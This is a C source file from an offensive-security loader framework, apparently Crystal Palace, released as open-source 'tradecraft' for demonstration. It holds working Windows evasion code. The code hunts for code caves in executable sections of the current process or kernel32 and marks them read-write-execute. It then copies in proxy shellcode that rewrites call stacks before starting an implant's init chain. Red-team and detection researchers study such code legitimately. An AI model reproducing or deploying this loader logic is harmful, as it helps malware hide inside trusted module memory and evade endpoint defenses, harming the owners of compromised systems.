/*
 * Copyright 2025 Raphael Mudge, Adversary Fan Fiction Writers Guild
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS Ã¢Â€ÂœAS ISÃ¢Â€Â AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
 
#include <windows.h>
#include "tcg.h"
#include "proxy.h"
 
WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA (LPCSTR lpModuleName);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc (LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualProtect (LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
 
/*
 * This is the Crystal Palace convention for getting ahold of data linked with this loader.
 */
char rPROXYPIC[0]    __attribute__((section("my_proxy")));
 
typedef struct {
        int   length;
        char  value[];
} _RESOURCE;
 
/* these might help */
#define memset(x, y, z) __stosb((unsigned char *)x, y, z);
#define memcpy(x, y, z) __movsb((unsigned char *)x, (unsigned char *)y, z);
#define FLAG(x, y) ( ((x) & (y)) == (y) )
#define ROUND_DOWN_PAGE(x) (char *)((ULONG_PTR)x - ((ULONG_PTR)x % 0x1000))
 
/*
 * find slack space at the end of an eXecutable section that can fit our payload.
 */
char * findCodeCave(char * dllBase, int length) {
    DLLDATA                 data;
    DWORD                   numberOfSections;
    IMAGE_SECTION_HEADER  * sectionHdr       = NULL;
    IMAGE_SECTION_HEADER  * sectionNxt       = NULL;
 
    /* parse our DLL! */
    ParseDLL(dllBase, &data);
 
    /* loop through our sections */
    numberOfSections = data.NtHeaders->FileHeader.NumberOfSections;
    sectionHdr       = (IMAGE_SECTION_HEADER *)PTR_OFFSET(data.OptionalHeader, data.NtHeaders->FileHeader.SizeOfOptionalHeader);
    for (int x = 0; (x + 1) < numberOfSections; x++) {
        /* look for our eXecutable section, there-in lives our... code cave */
        if (FLAG(sectionHdr->Characteristics, IMAGE_SCN_MEM_EXECUTE)) {
            /* let's look at our next section, we need it to get the right size of the code cave */
            sectionNxt      = sectionHdr + 1;
 
            /* calculate the size, based on section headers */
            DWORD size      = sectionNxt->VirtualAddress - sectionHdr->VirtualAddress;
 
            /* calculate the size of our code cave */
            DWORD cavesize  = size - sectionHdr->SizeOfRawData;
 
            /* if we fit, return it */
            if (length < cavesize)
                return dllBase + (sectionNxt->VirtualAddress - cavesize);
        }
 
        /* advance to our next section */
        sectionHdr++;
    }
 
    return NULL;
}
 
/*
 * Install our proxy PIC somewhere in memory, ideally in image memory (e.g., backed by a module on disk). This is
 * a risky and unmasked operation... but once this is done, we've got a nice call stack munging proxy that can run
 * whatever we give to it. And, that's pretty cool.
 */
PROXY SetupProxy() {
    _RESOURCE  * src;
    DWORD        oldProt;
    char       * hModule;
    PROXY        proxy;
 
    src = (_RESOURCE *)&rPROXYPIC;
 
    /* (1) we're going to search for a code cave in... our executable */
    hModule = (char *)KERNEL32$GetModuleHandleA(NULL);
    proxy   = (PROXY)findCodeCave(hModule, src->length);
 
    /* (2) if we can't find a code cave in our executable, let's find one elsewhere. How about kernel32?
     * And, a good place to note: bad idea on x86. There are reserved sections between sections breaking
     * my code cave calculation algorithm. You'll end up in memory you don't want to be in. */
#ifdef WIN_X64
    if (proxy == NULL) {
        /*
         * Note, we could use a stack string here or findModuleByHash with the ror13 hash of KERNEL32
         * But, my goal is demonstration of concepts and not leetsy-neatsy-wow, I applied ro13 999x
         * style "mastery of OPSEC"
         */
        hModule   = (char *)KERNEL32$GetModuleHandleA("KERNEL32");
        proxy     = (PROXY)findCodeCave(hModule, src->length);
    }
#endif
    /* (3) if there's no space in our executable, then just do a VirtualAlloc--life goes on */
    if (proxy == NULL)
        proxy = (PROXY)KERNEL32$VirtualAlloc( NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );
 
    /* change the permissions of our PIC to RWX */
    KERNEL32$VirtualProtect(ROUND_DOWN_PAGE(proxy), 0x1000, PAGE_EXECUTE_READWRITE, &oldProt);
 
    /* copy our proxy PIC over */
    memcpy(proxy, src->value, src->length);
 
    return proxy;
}
 
/* our config functions */
void configstackcutting(PROXY proxy, char * retaddr, char * frameaddr);
 
/* our initialization chain */
void init();
 
/*
 * tradecraft modules in this architecture are responsible for kicking off the init chain and its responsible for
 * providing a getStart() function implementation to make the beginning of our PIC findable
 */
void go() {
    /*
     * Note, we're using MingW64 intrinsics to get our frame ptr and return address.
     * I'm peeking the value of the frame ptr here to go one frame up.
     */
    char * retaddr   = __builtin_return_address(0);
    char * frameaddr = *(char **)__builtin_frame_address(0);
 
    /* setup our proxy */
    PROXY proxy = SetupProxy();
 
    /* push it over to our other module */
    configstackcutting(proxy, retaddr, frameaddr);
 
    /* start our init chain */
    init();
}
 
char * getStart() {
    return (char *)go;
}